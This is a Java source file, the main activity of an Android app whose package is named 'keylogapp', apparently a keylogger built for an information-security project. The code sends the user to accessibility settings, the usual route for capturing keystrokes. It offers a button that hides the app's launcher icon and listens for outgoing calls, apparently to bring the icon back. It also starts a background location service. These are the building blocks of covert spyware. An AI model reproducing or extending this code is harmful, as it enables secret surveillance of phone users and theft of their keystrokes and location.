package com.maemresen.infsec.keylogapp;

import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.INTERNET;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.maemresen.infsec.keylogapp.util.Helper;

public class MainActivity extends AppCompatActivity {
    
    private final static String LOG_TAG = Helper.getLogTag( MainActivity.class );
    private Button button, invisible;
    private AppVisibilityReceiver appVisibilityReceiver;
    
    @Override
    protected void onCreate( Bundle savedInstanceState ) {
        super.onCreate( savedInstanceState );
        setContentView( R.layout.activity_main );
        if (!checkPermission()) {
            requestPermission();
        }
        
        button = findViewById( R.id.appCompatButton );
        button.setOnClickListener( v -> {
            Intent openSettings = new Intent( Settings.ACTION_ACCESSIBILITY_SETTINGS );
            openSettings.addFlags( Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY );
            startActivity( openSettings );
        } );
        
        invisible = findViewById( R.id.buttonInvisible );
        invisible.setOnClickListener( new View.OnClickListener() {
            @Override
            public void onClick( View view ) {
                PackageManager packageManager = getPackageManager();
                ComponentName componentName = new ComponentName( MainActivity.this,
                        MainActivity.class );
                packageManager.setComponentEnabledSetting( componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP );
            }
        } );
        
        
        appVisibilityReceiver = new AppVisibilityReceiver();
        IntentFilter filter = new IntentFilter( Intent.ACTION_NEW_OUTGOING_CALL );
        registerReceiver( appVisibilityReceiver, filter );
        
        Intent serviceIntent = new Intent( MainActivity.this, LocationService.class );
        startService( serviceIntent );
        
    }
    
    protected void onDestroy() {
        super.onDestroy();
        // Unregister the AppVisibilityReceiver
        unregisterReceiver( appVisibilityReceiver );
    }
    
    private static final int PERMISSION_REQUEST_CODE = 200;
    
    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission( getApplicationContext(), INTERNET );
        return result == PackageManager.PERMISSION_GRANTED;
    }
    
    private void requestPermission() {
        ActivityCompat.requestPermissions( this, new String[]{ INTERNET }, PERMISSION_REQUEST_CODE );
    }
    
    @Override
    public void onRequestPermissionsResult( int requestCode, String permissions[], int[] grantResults ) {
        super.onRequestPermissionsResult( requestCode, permissions, grantResults );
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {
                    boolean internetAccepted = grantResults[ 0 ] == PackageManager.PERMISSION_GRANTED;
                    if (!internetAccepted) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale( ACCESS_FINE_LOCATION )) {
                                showMessageOKCancel( "You need to allow access to both the permissions",
                                        ( dialog, which ) -> {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                requestPermissions( new String[]{ INTERNET },
                                                        PERMISSION_REQUEST_CODE );
                                            }
                                        } );
                                return;
                            }
                        }
                        
                    }
                }
                
                
                break;
        }
    }
    
    private void showMessageOKCancel( String message, DialogInterface.OnClickListener okListener ) {
        new AlertDialog.Builder( MainActivity.this )
                .setMessage( message )
                .setPositiveButton( "OK", okListener )
                .setNegativeButton( "Cancel", null )
                .create()
                .show();
    }
    
    
}